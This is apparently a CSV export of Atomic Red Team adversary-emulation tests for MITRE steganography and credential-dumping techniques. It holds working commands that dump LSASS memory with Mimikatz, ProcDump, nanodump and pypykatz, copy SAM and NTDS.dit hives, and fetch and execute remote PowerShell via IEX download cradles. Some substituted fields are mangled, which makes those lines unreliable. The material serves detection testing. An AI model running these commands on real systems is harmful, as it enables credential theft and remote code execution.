"MITRE_ID","File","AtomicTest","ExecutorName","Command","Cleanup","Dependencies"
"T1001.002","C:\AtomicRedTeam\atomics\T1001.002\T1001.002.yaml","Steganographic Tarball Embedding","powershell","Get-Content ""Generating tarz file..."", ""Generating tarz file..."" -Encoding byte -ReadCount 0 | Set-Content ""Generating tarz file..."" -Encoding byte
","Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore
Remove-Item -Path ""Generating tarz file..."" -Force -ErrorAction Ignore
","New-Item -Type Directory (split-path ""#{image_file}"") -ErrorAction ignore | Out-Null Write-Output ""Downloading image file..."" $imageUrl = ""https://github.com/raghavsingh7/Pictures/raw/a9617d9fce289909441120a1e0366315c2c5e19d/lime.jpg"" Invoke-WebRequest -Uri $imageUrl -OutFile ""#{image_file}"" ; Write-Output ""Generating random passwords and saving to file..."" $passwords = 1..10 | ForEach-Object { -join ((1..12) | ForEach-Object { @('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z') + @('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z') + @('0','1','2','3','4','5','6','7','8','9') + @('!','@','#','$','%','^','&','*','(','(',')','-','=','+','_','[',']','{','}','|',';',';',':',',','<','>','?') | Get-Random }) } $passwords | Out-File -FilePath ""#{passwords_file}""     ; Write-Output ""Generating tarz file..."" tar -cvf ""#{tar_file}"" ""#{passwords_file}"" "
"T1001.002","C:\AtomicRedTeam\atomics\T1001.002\T1001.002.yaml","Embedded Script in Image Execution via Extract-Invoke-PSImage","powershell","cd ""PathToAtomicsFolder\ExternalPayloads\""
Import-Module .\Extract-Invoke-PSImage.ps1
$extractedScript=Extract-Invoke-PSImage -Image ""PathToAtomicsFolder\ExternalPayloads\"" -Out ""$HOME\result.ps1""
$scriptContent = Get-Content ""$HOME\result.ps1"" -Raw
$base64Pattern = ""(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])""
$base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value }
$base64Strings | Set-Content ""$HOME\decoded.ps1""
$decodedContent = Get-Content ""$HOME\decoded.ps1"" -Raw
$decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent))
$textPattern = '^.+'  
$textMatches = [regex]::Matches($decodedText, $textPattern) | ForEach-Object { $_.Value }
$scriptPath = ""$HOME\textExtraction.ps1""
$textMatches -join '' | Set-Content -Path $scriptPath
. ""$HOME\textExtraction.ps1""
","Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore
Remove-Item -Path ""$HOME\result.ps1"" -Force -ErrorAction Ignore 
Remove-Item -Path ""$HOME\textExtraction.ps1"" -Force -ErrorAction Ignore
Remove-Item -Path ""$HOME\decoded.ps1"" -Force -ErrorAction Ignore        
","New-Item -Type Directory (split-path ""#{image_file}"") -ErrorAction Ignore | Out-Null Write-Output ""Downloading image file..."" $imageUrl = ""https://github.com/raghavsingh7/Pictures/raw/f73e7686cdd848ed06e63af07f6f1a5e72de6320/evil_kitten.jpg"" Invoke-WebRequest -Uri $imageUrl -OutFile #{image_file} ; New-Item -Path ""PathToAtomicsFolder\ExternalPayloads\"" -ItemType Directory -Force | Out-Null Write-Output ""Downloading Extract-Invoke-PSImage.ps1 script..."" $scriptUrl = ""https://github.com/raghavsingh7/Extract-Invoke-PSImage/raw/7d8c165d2f9bfe9c3965181079b7c82e03168ce1/Extract-Invoke-PSImage.ps1"" Invoke-WebRequest -Uri $scriptUrl -OutFile #{psimage_script} "
"T1001.002","C:\AtomicRedTeam\atomics\T1001.002\T1001.002.yaml","Execute Embedded Script in Image via Steganography","sh","cat ""PathToAtomicsFolder/script.sh"" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat ""PathToAtomicsFolder/image.jpg"" - > ""PathToAtomicsFolder/evil_image.jpg""; strings ""PathToAtomicsFolder/evil_image.jpg"" | tail -n 1 | base64 -d | sh","rm ""PathToAtomicsFolder/evil_image.jpg""",""
"T1003","C:\AtomicRedTeam\atomics\T1003\T1003.yaml","Gsecdump","command_prompt","""#{gsecdump_exe}"" -a
",,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 $parentpath = Split-Path ""#{gsecdump_exe}""; $binpath = ""$parentpath\gsecdump-v2b5.exe"" IEX(IWR ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1"" -UseBasicParsing) if(Invoke-WebRequestVerifyHash ""#{gsecdump_url}"" ""$binpath"" #{gsecdump_bin_hash}){   Move-Item $binpath ""#{gsecdump_exe}"" } "
"T1003","C:\AtomicRedTeam\atomics\T1003\T1003.yaml","Send NTLM Hash with RPC Test Connection","powershell","rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM 1>$Null",,""
"T1003.001","C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml","Dump LSASS.exe Memory using ProcDump","command_prompt","""PathToAtomicsFolder\..\ExternalPayloads\"" -accepteula -ma lsass.exe PathToAtomicsFolder\..\ExternalPayloads\
","del ""PathToAtomicsFolder\..\ExternalPayloads\"" >nul 2> nul
","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest ""https://download.sysinternals.com/files/Procdump.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip"" Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\Procdump"" -Force New-Item -ItemType Directory (Split-Path ""#{procdump_exe}"") -Force | Out-Null Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\Procdump\Procdump.exe"" ""#{procdump_exe}"" -Force "
"T1003.001","C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml","Dump LSASS.exe Memory using direct system calls and API unhooking","command_prompt","""#{dumpert_exe}""
","del C:\windows\temp\dumpert.dmp >nul 2> nul
","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 New-Item -ItemType Directory (Split-Path ""#{dumpert_exe}"") -Force | Out-Null Invoke-WebRequest ""https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe"" -OutFile ""#{dumpert_exe}"" "
"T1003.001","C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml","Offline Credential Theft With Mimikatz","command_prompt","""Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)"" ""sekurlsa::minidump Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)"" ""sekurlsa::logonpasswords full"" exit
",,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"" -UseBasicParsing)  $releases = ""https://api.github.com/repos/gentilkiwi/mimikatz/releases"" $zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith("".zip"") } $basePath = Split-Path ""#{mimikatz_exe}"" | Split-Path Invoke-FetchFromZip $zipUrl ""x64/mimikatz.exe"" $basePath ; Write-Host ""Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)"" "
"T1003.001","C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml","LSASS read with pypykatz","command_prompt","""#{venv_path}\Scripts\pip.exe\Scripts\pypykatz"" live lsa 
","del ""%temp%\nanodump.dmp"" > nul 2> nul
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null invoke-webrequest ""https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"" Start-Process -FilePath ""PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"" -ArgumentList ""/quiet InstallAllUsers=1 PrependPath=1 Include_test=0"" -Wait ; py -m venv ""#{venv_path}"" ; & ""#{venv_path}\Scripts\pip.exe"" install --no-cache-dir pypykatz 2>&1 | Out-Null "
"T1003.001","C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml","Create Mini Dump of LSASS.exe using ProcDump","command_prompt","""PathToAtomicsFolder\..\ExternalPayloads\"" -accepteula -mm lsass.exe PathToAtomicsFolder\..\ExternalPayloads\
","del ""PathToAtomicsFolder\..\ExternalPayloads\"" >nul 2> nul
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest ""https://download.sysinternals.com/files/Procdump.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip"" Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\Procdump"" -Force New-Item -ItemType Directory (Split-Path ""#{procdump_exe}"") -Force | Out-Null Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\Procdump\Procdump.exe"" ""#{procdump_exe}"" -Force "
"T1003.001","C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml","Powershell Mimikatz","powershell","IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
",,""
"T1003.001","C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml","Dump LSASS.exe using imported Microsoft DLLs","powershell","https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe -out https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe -x 0x41
","Remove-Item https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe -ErrorAction Ignore
","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 Invoke-WebRequest ""https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe"" -OutFile #{xordump_exe} "
"T1003.001","C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml","Dump LSASS.exe Memory through Silent Process Exit","command_prompt","PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe --silent-process-exit ""PathToAtomicsFolder\..\ExternalPayloads\""
","rmdir ""PathToAtomicsFolder\..\ExternalPayloads\"" /s /q >nul 2> nul
","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null Invoke-WebRequest ""https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe"" "
"T1003.002","C:\AtomicRedTeam\atomics\T1003.002\T1003.002.yaml","Registry parse with pypykatz","command_prompt","""#{venv_path}\Scripts\pip.exe\Scripts\pypykatz"" live lsa 
",,"New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null invoke-webrequest ""https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"" Start-Process -FilePath ""PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"" -ArgumentList ""/quiet InstallAllUsers=1 PrependPath=1 Include_test=0"" -Wait ; py -m venv ""#{venv_path}"" ; & ""#{venv_path}\Scripts\pip.exe"" install --no-cache-dir pypykatz 2>&1 | Out-Null "
"T1003.002","C:\AtomicRedTeam\atomics\T1003.002\T1003.002.yaml","esentutl.exe SAM copy","command_prompt","esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM
","del %temp%\SAM >nul 2>&1
",""
"T1003.002","C:\AtomicRedTeam\atomics\T1003.002\T1003.002.yaml","dump volume shadow copy hives with certutil","command_prompt","for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*
","for /L %a in (1,1,10) do @(del %temp%\SAMvss%a >nul 2>&1)
",""
"T1003.002","C:\AtomicRedTeam\atomics\T1003.002\T1003.002.yaml","dump volume shadow copy hives with System.IO.File","powershell","1..10 | % { 
 try { [System.IO.File]::Copy(""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\SAM"" , ""$env:TEMP\SAMvss$_"", ""true"") } catch {}
 ls ""$env:TEMP\SAMvss$_"" -ErrorAction Ignore
}
","1..10 | % {
  rm ""$env:TEMP\SAMvss$_"" -ErrorAction Ignore
}
",""
"T1003.003","C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml","Create Volume Shadow Copy with vssadmin","command_prompt","vssadmin.exe create shadow /for=C:
",,"echo Sorry, Promoting this machine to a Domain Controller must be done manually "
"T1003.003","C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml","Copy NTDS.dit from Volume Shadow Copy","command_prompt","copy Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'\Windows\NTDS\NTDS.dit Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'\ntds.dit
copy Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'\Windows\System32\config\SYSTEM Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'\VSC_SYSTEM_HIVE
reg save HKLM\SYSTEM Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'\SYSTEM_HIVE
","del ""Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'\ntds.dit""        >nul 2> nul
del ""Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'\VSC_SYSTEM_HIVE"" >nul 2> nul
del ""Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'\SYSTEM_HIVE""     >nul 2> nul
","echo Sorry, Promoting this machine to a Domain Controller must be done manually ; echo Run ""Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'"" to fulfill this requirement ; mkdir #{extract_path} "
"T1003.003","C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml","Dump Active Directory Database with NTDSUtil","command_prompt","mkdir C:\Windows\Temp\ntds_T1003
ntdsutil ""ac i ntds"" ""ifm"" ""create full C:\Windows\Temp\ntds_T1003"" q q
","rmdir /q /s C:\Windows\Temp\ntds_T1003 >nul 2>&1
","echo Sorry, Promoting this machine to a Domain Controller must be done manually "
"T1003.003","C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml","Create Volume Shadow Copy with WMI","command_prompt","wmic shadowcopy call create Volume=C:\
",,"echo Sorry, Promoting this machine to a Domain Controller must be done manually "
"T1003.003","C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml","Create Volume Shadow Copy remotely with WMI","command_prompt","wmic /node:""localhost"" shadowcopy call create Volume=C:\
",,"echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target) "
"T1003.003","C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml","Create Volume Shadow Copy remotely (WMI) with esentutl","command_prompt","wmic /node:""localhost"" process call create ""cmd.exe /c esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\ntds.dit""
",,"echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target) "
"T1003.003","C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml","Create Volume Shadow Copy with Powershell","powershell","(gwmi -list win32_shadowcopy).Create('C:\','ClientAccessible')
",,""
"T1003.003","C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml","Create Symlink to Volume Shadow Copy","command_prompt","vssadmin.exe create shadow /for=C:
mklink /D C:\Temp\vssstore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
",,""
"T1003.003","C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml","Create Volume Shadow Copy with diskshadow","command_prompt","mkdir c:\exfil
diskshadow.exe /s PathToAtomicsFolder\T1003.003\src\diskshadow.txt
",,""
"T1003.003","C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml","Copy NTDS in low level NTFS acquisition via MFT parsing","powershell","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR https://raw.githubusercontent.com/kfallahi/UnderlayCopy/37f2e9b76b724bc1211437b14deaf1e76b21791e/UnderlayCopy.ps1 -UseBasicParsing)
Underlay-Copy -Mode MFT -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile C:\Windows\Temp\ntds.dit
Underlay-Copy -Mode MFT -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile C:\Windows\Temp\SYSTEM_HIVE
","remove-item ""C:\Windows\Temp\ntds.dit"" -force -erroraction silentlycontinue
remove-item ""C:\Windows\Temp\SYSTEM_HIVE"" -force -erroraction silentlycontinue
",""
